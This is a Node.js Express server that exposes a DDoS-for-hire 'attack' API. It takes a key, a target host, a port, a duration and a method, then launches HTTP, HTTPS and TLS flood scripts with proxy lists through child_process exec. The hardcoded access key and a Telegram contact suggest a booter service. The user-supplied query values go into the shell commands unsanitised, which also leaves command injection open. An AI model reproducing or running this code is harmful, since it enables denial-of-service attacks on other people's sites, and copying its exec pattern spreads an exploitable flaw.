const express = require('express');
const app = express();
const port = 9998;
var exec = require('child_process').exec

app.get('/api/attack', (req, res) => {
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`)
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Fail Url API : /api/attack?key=[key]&host=[url]&port[port]&method=[methods]&time=[time]`,
      info: `t.me/bolongyn`
    };
    return res.status(400).send(err_u);
  }

  if (key !== 'bolosuss') {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
      info: `t.me/bolongyn`
    };
    return res.status(400).send(err_key);
  }

  if (time > 1200) {
    const err_time = {
      status: `error`,
      message: `Error Time < 1200 Second`,
      info: `t.me/bolongyn`
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
      info: `t.me/bolongyn`
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === 'https' ||
      method.toLowerCase() === 'http' ||
      method.toLowerCase() === 'http-tron' ||
      method.toLowerCase() === 'https-kill' ||
      method.toLowerCase() === 'http-lmao' ||
      method.toLowerCase() === 'tls'
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `t.me/bolongyn`
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `success`,
    message: `Send Attack Successful`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    info: `t.me/bolongyn`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === 'https') {
    
    exec(`node https.js GET ${host} ${port} ${time} 25 90 proxy.txt --full --http mix`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
     
    });
  }
  if (method.toLowerCase() === 'tls') {
    
    exec(`node rapid.js ${host} ${time} 65 5 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [TLS] executed successfully`);
     
    });
  }
  if (method.toLowerCase() === 'http') {
    
    exec(`flooder.js ${host} ${time} 90 25 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [HTTP] executed successfully`);
     
    });
  }
  if (method.toLowerCase() === 'http-tron') {
    
    exec(`node mars.js ${host} ${time} 90 25 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [HTTP-TRON] executed successfully`);
     
    });
  }
  if (method.toLowerCase() === 'https-kill') {
    
    exec(`node httpskill.js GET ${time} 20 proxy.txt 90 ${host}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [HTTPS-KILL] executed successfully`);
     
    });
  }
  if (method.toLowerCase() === 'http-lmao') {

    exec(`node http.js ${host} ${time} 90 25 proxy.txt GET REAL NO`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      if (stdout) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [HTTP-LMAO] executed successfully`);
     
    });
  }
})
app.listen(port, () => {
  console.log(`[API] running on http://localhost:${port}`);
});